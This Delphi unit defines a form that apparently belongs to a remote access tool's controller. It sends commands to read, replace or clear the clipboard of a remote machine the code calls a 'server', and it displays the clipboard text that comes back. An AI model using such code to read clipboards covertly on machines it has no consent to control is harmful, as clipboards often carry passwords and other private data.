unit UnitClipboard;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitMain, StdCtrls, ComCtrls, Buttons, ExtCtrls, sSkinProvider, UnitConexao;

type
  TFormClipboard = class(TForm)
    Panel1: TPanel;
    SpeedButton1: TSpeedButton;
    SpeedButton2: TSpeedButton;
    SpeedButton3: TSpeedButton;
    StatusBar1: TStatusBar;
    RichEdit1: TRichEdit;
    sSkinProvider1: TsSkinProvider;
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormShow(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure SpeedButton3Click(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    NomePC: string;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
	  procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormClipboard: TFormClipboard;

implementation

{$R *.dfm}

uses
  UnitConstantes,
  UnitStrings,
  CustomIniFiles,
  UnitCommonProcedures;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormClipboard.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end; 

procedure TFormClipboard.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormClipboard.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  if FormMain.ControlCenter = True then Exit;
  Params.WndParent := GetDesktopWindow;
end;

constructor TFormClipboard.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  if FileExists(TempStr) = True then
  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('Clipboard', 'Width', Width);
    Height := IniFile.ReadInteger('Clipboard', 'Height', Height);
    Left := IniFile.ReadInteger('Clipboard', 'Left', Left);
    Top := IniFile.ReadInteger('Clipboard', 'Top', Top);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

procedure TFormClipboard.AtualizarIdioma;
begin
  SpeedButton1.Caption := traduzidos[192];
  SpeedButton2.Caption := traduzidos[393];
  SpeedButton3.Caption := traduzidos[394];
end;

procedure TFormClipboard.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  TempInt: Integer;
  TempStr: string;
  i: integer;
  Result: TSplit;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = GETCLIPBOARD then
  begin
    StatusBar1.Panels.Items[0].Text := traduzidos[395];
    delete(Recebido, 1, posex('|', Recebido));
    RichEdit1.Clear;
    if posex(delimitadorComandos, Recebido) > 0 then
    begin
      RichEdit1.Lines.Add('((((( ' + traduzidos[399] + ' )))))');
      RichEdit1.Lines.Add('');
      while Recebido <> '' do
      begin
        RichEdit1.Lines.Add(Copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1));
        delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
        delete(Recebido, 1, length(delimitadorComandos));
      end;
    end else
    RichEdit1.Lines.Add(Recebido);
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = CLEARCLIPBOARD then
  begin
    RichEdit1.Clear;
    StatusBar1.Panels.Items[0].Text := traduzidos[396];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = SETCLIPBOARD then
  begin
    StatusBar1.Panels.Items[0].Text := traduzidos[397];
  end else

end;

procedure TFormClipboard.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  RichEdit1.Clear;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);

  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('Clipboard', 'Width', Width);
    IniFile.WriteInteger('Clipboard', 'Height', Height);
    IniFile.WriteInteger('Clipboard', 'Left', Left);
    IniFile.WriteInteger('Clipboard', 'Top', Top);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;
end;

procedure TFormClipboard.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
end;

procedure TFormClipboard.FormShow(Sender: TObject);
begin
  AtualizarIdioma;
  RichEdit1.Clear;
  SpeedButton1Click(SpeedButton1);
end;

procedure TFormClipboard.SpeedButton1Click(Sender: TObject);
begin
  Servidor.enviarString(GETCLIPBOARD + '|');
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormClipboard.SpeedButton2Click(Sender: TObject);
begin
  Servidor.enviarString(SETCLIPBOARD + '|' + RichEdit1.Text);
end;

procedure TFormClipboard.SpeedButton3Click(Sender: TObject);
begin
  Servidor.enviarString(CLEARCLIPBOARD + '|');
end;

end.
